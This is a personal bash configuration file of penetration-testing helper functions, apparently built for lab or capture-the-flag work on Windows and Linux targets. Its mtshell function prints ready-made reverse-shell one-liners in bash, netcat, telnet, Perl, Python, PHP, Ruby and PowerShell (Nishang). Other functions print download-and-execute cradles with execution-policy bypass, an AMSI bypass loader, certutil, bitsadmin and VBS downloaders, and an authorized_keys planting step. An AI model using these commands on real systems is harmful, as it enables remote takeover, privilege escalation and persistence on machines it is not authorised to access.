[ -z "$ZSH_NAME" ] && [ -f ~/.fzf.bash ] && source ~/.fzf.bash

#  set alias for clip (so you can pipe to |clip)
alias clip="xclip -r -selection c"


setip () {
  if [ "$1" == "t" -a ! -z $2 ]; then
    printf "$2" > /tmp/tip
    chmod 777 /tmp/tip
  elif [ "$1" == "a" ]; then
    if [ -z "$2" ]; then 
      ifconfig  
      printf "set ip: "
      read newip
      printf "$newip" > /tmp/ip
    else 
      printf "$2" > /tmp/ip
    fi
    chmod 777 /tmp/ip
  else
    echo "need a target"
    echo "usage: setip [t|a] <ip>"
  fi
}

getip () {
  if [ "$1" == "t" ]; then
    checkip t
    cat /tmp/tip
  elif [ "$1" == "a" ]; then
    checkip a
    cat /tmp/ip
  else
    echo "need a target"
    echo "usage: getip [t|a] IP"
  fi
}

checkip () {
    if [ "$1" == "t" ]; then
      if ! test -f "/tmp/tip"; then
        printf "\n\nenter target ip: "
        read ip
        setip t $ip
      fi
    elif [ "$1" == "a" ]; then
      if ! test -f "/tmp/ip"; then
        ifconfig
        printf "\n\nenter ip: "
        read ip
        setip a $ip
      fi
    else
      echo "need a target"
      echo "usage: checkip [t|a]"
    fi
}


# quick host smb server at current directory
hostsmb ()
{
    ifconfig |grep inet -B1
    echo
    ls
    echo
    python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share . 
}

# quick host http server at current directory on given port
hosthttp () 
{
    if [ $# -eq 0 ]; then
        echo "usage: hosthttp <port>"
    else
        ifconfig |grep inet -B1
        echo
        ifconfig| grep inet| sed 's/ \{1,\}/,/g'| cut -d',' -f3|grep ".*\..*\..*" | xargs -L1 -I{} sh -c "echo http://{}:$1/"
        echo
        ls
        echo
        python3 -m http.server $1
    fi
}

files () 
{
	cd /opt/hacking-myTools/useful_files/files
}

tools () 
{
    cd /opt/hacking-myTools/tools
}

mylinenum () {
  cd /opt/hacking-myTools/tools/privesc/linux
}

winpeasexe () {
	cd "/opt/hacking-myTools/useful_files/files/all/github/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/Obfuscated Releases"
}

winpeasbat () {
	cd "/opt/hacking-myTools/useful_files/files/all/github/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASbat"
}


powerup () {
  checkip t
  if [ ! -z $1 ]; then
    1=:$1
  fi
  
  cd /opt/hacking-myTools/useful_files/files/windows/github/PowerSploit/Privesc
  printf "powershell -ep bypass IEX(New-Object Net.WebClient).downloadString('http://$(getip a)$1/PowerUp.ps1')\n"
}

powerview () {
  checkip t
  if [ ! -z $1 ]; then
    1=:$1
  fi
  
  cd /opt/hacking-myTools/useful_files/files/windows/github/PowerSploit/Recon/
  printf "powershell -ep bypass IEX(New-Object Net.WebClient).downloadString('http://$(getip a)$1/PowerView.ps1')\n"
}

amsi () {
	checkip t
	if [ ! -z $1 ]; then
		1=:$1
	fi

	cd /opt/hacking-myTools/tools/privesc/windows
	printf "powershell -ep bypass IEX(New-Object Net.WebClient).downloadString('http://$(getip a)$1/amsibypass.ps1')\n"
}

sss () {
  searchsploit $@
}

ssm () {
  searchsploit -m $1
}

ssx () {
  searchsploit -x $1
}

ssu () {
	tmp_dir=$(pwd)
	cd /opt/exploitdb
	git pull
	cd $tmp_dir
}


windown () {
  checkip a
  if [ ! -z $1 ]; then
    1=:$1
  fi

	printf ">>>>>>>>>>>>> COPY/PASTE BELOW TO TARGET TERMINAL <<<<<<<<<<<<<<<<<\n"
	printf "## USING cscript.exe \n"
	printf "# Create .vbs script and execute\n"
	printf "del downloadfile.vbs 2>nul\n"
	printf "\n"
	printf "echo Set Arg = WScript.Arguments >> downloadfile.vbs\n"
	printf "\n"
	printf "echo If WScript.Arguments.Count ^<^> 2 Then >> downloadfile.vbs\n"
	printf "echo   WScript.Echo \"Invalid number of arguments\" >> downloadfile.vbs\n"
	printf "echo   WScript.Echo \"Usage: cscript.exe downloadfile.vbs <download_url> <destination_path>\" >> downloadfile.vbs >> downloadfile.vbs\n"
	printf "echo   WScript.Echo \"Usage: cscript.exe downloadfile.vbs \"\"http:///$(getip a)$1/powerup.ps1\"\" \"\"C:\\\\users\\public\\downloads\\powerup.ps1\"\"\" >> downloadfile.vbs\n"
	printf "echo   WScript.Quit >> downloadfile.vbs\n"
	printf "echo End If >> downloadfile.vbs\n"
	printf "\n"
	printf "echo strFileURL = Arg(0) 'CHANGE LOCATION  >> downloadfile.vbs\n"
	printf "echo strHDLocation = Arg(1) 'DESTINAION  >> downloadfile.vbs\n"
	printf "\n"
	printf "\n"
	printf "echo ' Fetch the file >> downloadfile.vbs\n"
	printf "echo     Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> downloadfile.vbs\n"
	printf "\n"
	printf "echo     objXMLHTTP.open \"GET\", strFileURL, false >> downloadfile.vbs\n"
	printf "echo     objXMLHTTP.send() >> downloadfile.vbs\n"
	printf "\n"
	printf "echo If objXMLHTTP.Status = 200 Then >> downloadfile.vbs\n"
	printf "echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> downloadfile.vbs\n"
	printf "echo objADOStream.Open >> downloadfile.vbs\n"
	printf "echo objADOStream.Type = 1 'adTypeBinary >> downloadfile.vbs\n"
	printf "\n"
	printf "echo objADOStream.Write objXMLHTTP.ResponseBody >> downloadfile.vbs\n"
	printf "echo objADOStream.Position = 0    'Set the stream position to the start >> downloadfile.vbs\n"
	printf "\n"
	printf "echo Set objFSO = CreateObject(\"Scripting.FileSystemObject\") >> downloadfile.vbs\n"
	printf "echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> downloadfile.vbs\n"
	printf "echo Set objFSO = Nothing >> downloadfile.vbs\n"
	printf "\n"
	printf "echo objADOStream.SaveToFile strHDLocation >> downloadfile.vbs\n"
	printf "echo objADOStream.Close >> downloadfile.vbs\n"
	printf "echo Set objADOStream = Nothing >> downloadfile.vbs\n"
	printf "echo End if >> downloadfile.vbs\n"
	printf "\n"
	printf "echo Set objXMLHTTP = Nothing >> downloadfile.vbs\n"
	printf "\n"
	printf "\n"
	printf "\n"
  printf ">>>>>>>>>>>>> USE THIS COMMAND TO EXECUTE DOWNLOAD <<<<<<<<<<<<<<<<<\n"
  printf "cscript.exe downloadfile.vbs"
  echo 
  printf '\n\n\n\n\n'
  echo "powershell -ep bypass IEX(New-Object Net.WebClient).downloadString('http://$(getip a)$1/PowerUp.ps1')"
  echo -e "powershell.exe -ep bypass Invoke-Webrequest 'http://$(getip a)$1/PowerUp.ps1' -OutFile \"PowerUp.ps1\"" 
  echo
  echo "certutil.exe -urlcache -split -f \"https://$(getip a)$1/PowerUp.ps1\" PowerUp.ps1"
  echo
  echo "bitsadmin /transfer myDownloadJob /download /priority normal \"http://$(getip a)$1/PowerUp.ps1\" c:\PowerUp.ps1"
}

tohex () {
  output=$(printf "$1" | tr -d '\n' | xxd -ps -c 200)
  echo Copied to clipboard: 0x$output
  printf "0x$output" | clip  
}

catmc () {
	find . -name _manual_commands.txt -readable -exec cat {} \; 2>/dev/null
}

catc () {
	find . -name _commands.log -readable -exec cat {} \; 2>/dev/null
}


mt () {
  echo ">>>> get/set ips <<<<"
  echo "setip t|a"
  echo "setip t|a"

  echo
  echo ">>>> General <<<<"
  echo "tools"
  echo "files"
  echo "hosthttp <port>"
  echo "hostsmb"

  echo
  echo ">>>> Linux <<<<"
	echo "mtInitialLinux"
  echo "cat /opt/hacking-myTools/tools/privesc/linux/recon_functions.sh | clip"
  echo "mylinenum"

  echo
  echo ">>>> Windows <<<<"
	echo "mtInitialWindows"
  echo "cat /opt/hacking-myTools/tools/privesc/windows/recon_functions.ps1 | clip"
	echo "windows pspy: cd /opt/hacking-myTools/tools/privesc/windows"
  echo "powerup <port>"
  echo "winpeasexe"
  echo "winpeasbat"
  echo "amsi <port>"
  echo "windown <port>"
  echo "** don't forget Seatbelt **"

  echo
  echo ">>>> Searchsploit <<<<"
  echo "ssu"

  echo 
  echo ">>>> Other <<<<"
  echo "tohex <string>"
  echo "catmc | grep ffuf"
  echo "catc"
  echo "mtssh # create ssh key"
  echo "hex2bin"
  echo "bin2hex"
  
}

mtInitialLinux () {
  if [ -z $1 ]; then
    echo "Need port number"
    echo "Usage: mtl <port>"
    return
  fi

  checkip a

  echo "# >>>> DOWNLOAD <<<<"
  echo "wget http://$(getip a):$1/tools/privesc/linux/mylinenum.sh" 
  echo "wget http://$(getip a):$1/useful_files/files/linux/linpeas.sh"
  echo "wget http://$(getip a):$1/useful_files/files/linux/lse.sh"
  echo "wget http://$(getip a):$1/useful_files/files/linux/LinEnum.sh"
  echo "wget http://$(getip a):$1/useful_files/files/linux/linux-exploit-suggester.sh" 
  echo "wget http://$(getip a):$1/useful_files/files/linux/suid3num.py" 
  echo "# >>> run <<<<"
  echo "mkdir output 2>/dev/null"
  echo "bash mylinenum.sh > ./output/mylinenum.txt &"
  echo "bash linpeas.sh > ./output/linpeas.txt &"
  echo "bash lse.sh > ./output/lse.txt &"
  echo "bash LinEnum.sh > ./output/LinEnum.txt &"
  echo "bash linux-exploit-suggester.sh > ./output/linux-exploit-suggester.txt &"
  echo "python3 suid3num.py > ./output/suid3num.txt &"
  echo 
  echo "# >>>> PSPY <<<<" 
  echo "wget http://$(getip a):$1/useful_files/files/linux/pspy32 && chmod +x pspy32 && ./pspy32 > ./output/pspy.txt &" 
  echo "wget http://$(getip a):$1/useful_files/files/linux/pspy64 && chmod +x pspy64 && ./pspy64 > ./output/pspy.txt &"

  printf "\n\n\n"
  cd /opt/hacking-myTools
  python3 -m http.server $1
}


mtInitialWindows () {
  if [[ -z "$1" || -z "$2" ]]; then 
    echo "ERROR: INVALID PARAMETERS"
    echo "valid download_methods: vbs|powershell1|powershell2|certutil|bitsadmin|smb"
    echo "Usage: miw <port> <download_method> [destination_prefix]"
    echo "Usage: miw 80 certutil "

    return
  fi
   
  rm /tmp/download_tmp.txt 2>/dev/null
  if [ "$2" = "vbs" ]; then
    printf "## USING cscript.exe \n" >> /tmp/download_tmp.txt
    printf "# Create .vbs script and execute\n" >> /tmp/download_tmp.txt
    printf "del downloadfile.vbs 2>nul\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo Set Arg = WScript.Arguments >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo If WScript.Arguments.Count ^<^> 2 Then >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo   WScript.Echo \"Invalid number of arguments\" >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo   WScript.Echo \"Usage: cscript.exe downloadfile.vbs <download_url> <destination_path>\" >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo   WScript.Echo \"Usage: cscript.exe downloadfile.vbs \"\"http:///$(getip a)$1/powerup.ps1\"\" \"\"C:\\\\users\\public\\downloads\\powerup.ps1\"\"\" >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo   WScript.Quit >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo End If >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo strFileURL = Arg(0) 'CHANGE LOCATION  >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo strHDLocation = Arg(1) 'DESTINAION  >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo ' Fetch the file >> downloadfile.vbs\n"
    printf "echo     Set objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\") >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo     objXMLHTTP.open \"GET\", strFileURL, false >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo     objXMLHTTP.send() >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo If objXMLHTTP.Status = 200 Then >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo Set objADOStream = CreateObject(\"ADODB.Stream\") >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.Open >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.Type = 1 'adTypeBinary >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.Write objXMLHTTP.ResponseBody >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.Position = 0    'Set the stream position to the start >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo Set objFSO = CreateObject(\"Scripting.FileSystemObject\") >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo Set objFSO = Nothing >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.SaveToFile strHDLocation >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo objADOStream.Close >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "echo Set objADOStream = Nothing >> downloadfile.vbs\n"
    printf "echo End if >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "echo Set objXMLHTTP = Nothing >> downloadfile.vbs\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf "\n" >> /tmp/download_tmp.txt
    printf ">>>>>>>>>>>>> USE THIS COMMAND TO EXECUTE DOWNLOAD <<<<<<<<<<<<<<<<<\n" >> /tmp/download_tmp.txt
    printf "cscript.exe downloadfile.vbs\n" >> /tmp/download_tmp.txt
  fi 


  windownf () {
    if [ ! -z $1 ]; then
      port=":$1"
    fi


    if [[ -z "$2" || -z "$3" || -z "$4" ]]; then 
      echo "ERROR: INVALID PARAMETERS"
      echo "valid download_methods: vbs|powershell1|powershell2|certutil|bitsadmin|smb"
      echo "Usage: miw <port> <download_method> <src_path> <dest_path>"
      echo "Usage: miw 80 certutil ./powerup.ps1 C:\users\public\downloads\powerup.ps1"
      return
    fi


    if [ "$2" = "smb" ]; then
      printf "copy \"\\\\\\\\$(getip a)\\\\share\\\\$3\" \"$4\"\n" | tr '/' '\\'
    fi
    

    if [ "$2" = "vbs" ]; then
      tmp=$(echo $3 | sed 's/ /%20/g')
      echo -e "cscript.exe downloadfile.vbs \"http://$(getip a)$port/$tmp\" \"$4\""
    fi
    # printf "cscript.exe downloadfile.vbs\n\n"

    ## ONLY FOR RUNNING .ps1 FILES
    if [ "$2" = "powershell1" ]; then
      tmp=$(echo $3 | tr ' ' '%20')
      echo -e "powershell.exe -ep bypass IEX(New-Object Net.WebClient).downloadString('http://$(getip a)$port/$tmp')"
    fi

    if [ "$2" = "powershell2" ]; then
      tmp=$(urlencode $3)
      echo -e "powershell.exe -ep bypass Invoke-Webrequest 'http://$(getip a)$port/$tmp' -OutFile \"$4\"" 
    fi

    
    if [ "$2" = "certutil" ]; then
      tmp=$(echo $3 | tr ' ' '%20')
      echo -e "certutil.exe -urlcache -split -f \"http://$(getip a)$port/$tmp\" \"$4\"" 
        
    fi
    
    if [ "$2" = "bitsadmin" ]; then
      tmp=$(echo $3 | tr ' ' '%20')
      echo -e "bitsadmin /transfer myDownloadJob /download /priority normal \"http://$(getip a)$port/$tmp\" \"$4\"" 
    fi 
  }



  cd /opt/hacking-myTools

  # download
  echo "---- DOWNLOAD ----"
  windownf "$1" "$2" "useful_files/files/windows/github/PowerSploit/Privesc/PowerUp.ps1" "$3PowerUp.ps1" >> /tmp/download_tmp.txt
  windownf "$1" "$2" "tools/privesc/windows/mywinenum.bat" "$3mywinenum.bat" >> /tmp/download_tmp.txt
  windownf "$1" "$2" "tools/privesc/windows/pspy.exe" "$3pspy.exe" >> /tmp/download_tmp.txt
  windownf "$1" "$2" "useful_files/files/all/github/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/Obfuscated Releases/winPEASany.exe" "$3winPEASany.exe" >> /tmp/download_tmp.txt
  windownf "$1" "$2" "useful_files/files/windows/jaws-enum.ps1" "$3jaws-enum.ps1" >> /tmp/download_tmp.txt
  windownf "$1" "$2" "useful_files/files/windows/github/Ghostpack-CompiledBinaries/Seatbelt.exe" "$3Seatbelt.exe" >> /tmp/download_tmp.txt


  cat /tmp/download_tmp.txt
  cat /tmp/download_tmp.txt | clip

  # execute
  echo
  echo "---- EXECUTE from cmd.exe ----"
  printf "mkdir output 2>nul\n"
  echo -e "start /B winPEASany.exe > .\output\winpeas.txt"
  echo -e "start /B Seatbelt.exe -group=all > .\output\seatbelt.txt"
  echo -e "start /B mywinenum.bat > C:/users/public/downloads/mywinenum.txt"
  echo -e "start /B pspy.exe C:/users/public/downloads/pspyoutput.txt"
  echo -e "echo Invoke-AllChecks >> PowerUp.ps1"
  echo -e "powershell.exe -ep bypass .\PowerUp.ps1 > .\output\PowerUp.txt"
  echo -e "powershell.exe -ep bypass .\jaws-enum.ps1 > .\output\jaws-enum.txt"
  # start /B C:\users\public\downloads\pspy.exe C:\users\public\downloads\pspyoutput.txt

  echo
  echo
  echo "---- EXECUTE from powershell ----"
  # powershell
  printf "mkdir output\n"
  echo -e 'start-job -scriptblock { Param ([string] $path); ."$path/winPEASany.exe" > "$path/output/winpeas.txt" } -argumentlist (get-location).path'
  echo -e 'start-job -scriptblock { Param ([string] $path); ."$path/Seatbelt.exe" "-group=all" > "$path/output/seatbelt.txt" } -argumentlist (get-location).path'
  echo -e 'start-job -scriptblock { Param ([string] $path); ."$path/mywinenum.bat" > "$path/output/mywinenum.txt" } -argumentlist (get-location).path'
  echo -e 'start-job -scriptblock { Param ([string] $path); ."$path/pspy.exe" "$path/output/pspyoutput.txt" } -argumentlist (get-location).path'
  echo -e 'start-job -scriptblock { Param ([string] $path); ."$path/PowerUp.ps1"; Invoke-AllChecks > "$path/output/powerup.txt" } -argumentlist (get-location).path'
  echo -e 'start-job -scriptblock { Param ([string] $path); ."$path/jaws-enum.ps1" > "$path/output/jaws-enum.txt" } -argumentlist (get-location).path'


  echo "-----------------------"
  echo

  if [ "$2" = "smb" ]; then
    hostsmb
  else 
    hosthttp 80
  fi 
}


# start-job -scriptblock { get-location  }


function mtshell {
        
    if [ -z $1 ]; then
        echo "Port required"
        echo "Usage: mtshell <port>"
        return
    fi

    checkip a
        
    echo ">>>> BASH <<<<"
    echo "bash -c 'bash -i >& /dev/tcp/$(getip a)/$1 0>&1'"
    echo "bash -c '{echo,$(echo "bash -i >& /dev/tcp/$(getip a)/$1 0>&1" | base64 )}|{base64,-d}|{bash,-i}'"

    echo
    echo ">>>> Telnet <<<<"
    echo "mknod a p; telnet $(getip a) $1 0<a | /bin/sh 1>a"

    echo
    echo ">>>> Netcat <<<<"
    echo "nc -e /bin/sh $(getip a) $1    # also try '-e bash' '-e sh'"      
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $(getip a) $1 >/tmp/f"


    echo 
    echo ">>>> PERL <<<<"
    echo "perl -e 'use Socket;\$i=\"$(getip a)\";\$p=$1;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

    echo
    echo Python
    echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$(getip a)\",$1));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    echo
    echo ">>>> PHP <<<<"
    echo "This code assumes that the TCP connection uses file descriptor 3. This worked on my test system. If it does not work, try 4, 5, 6…"

    echo "php -r '\$sock=fsockopen(\"$(getip a)\",$1);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    # # echo # OPTION 1
    # # echo # nc closes immediately on connect, try this
    # # $sock = fsockopen("127.0.0.1",1234);
    # # $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);

    # # echo # OPTION 2
    # # <?php
    # # exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");

    echo
    echo ">>>> Ruby <<<<"
    echo "ruby -rsocket -e'f=TCPSocket.open(\"$(getip a)\",$1).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"



    echo 
    echo
    echo ">>>> Windows Nishing <<<<"
    echo "cp /opt/hacking-myTools/useful_files/files/windows/github/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1"
    echo "echo Invoke-PowerShellTcp -Reverse -IPAddress $(getip a) -Port RPORT >> rev.ps1"
    echo "hosthttp $1"
    echo 
    echo "# Trigger (FROM TARGET)"
    echo "powershell -ep bypass IEX(New-Object Net.WebClient).downloadString('http://$(getip a):$1/rev.ps1')"
}


function mtssh {
    ssh-keygen -f safe
    chmod 600 safe
    cat safe.pub
    echo "echo $(cat safe.pub) > authorized_keys" | clip
}


function hex2bin {
  if [[ -z $1 ]]; then
    echo "Usage: hex2bin <file.bin>"
    return
  fi
  echo "$(cat "$1")" | xxd -r -p
}

function bin2hex {
  if [[ -z $1 ]]; then
    echo "Usage: bin2hex <binary>"
    return
  fi
  
  hexdump -v -e '1/1 "%02x"' "$1"
}

alias searchsploit=/opt/exploitdb/searchsploit
alias fuffe="python3 /opt/hacking-myTools/tools/test_endpoint_ffuf.py"
alias qscan="masscan -p1-65535,U:1-65535 $1 --rate=1000"

alias msf-help='ls /usr/share/metasploit-framework/tools/exploit'
alias code='/snap/bin/code --no-sandbox'


export GOPATH=$HOME/go
export PATH=$PATH:$GOROOT/bin:$GOPATH/bin
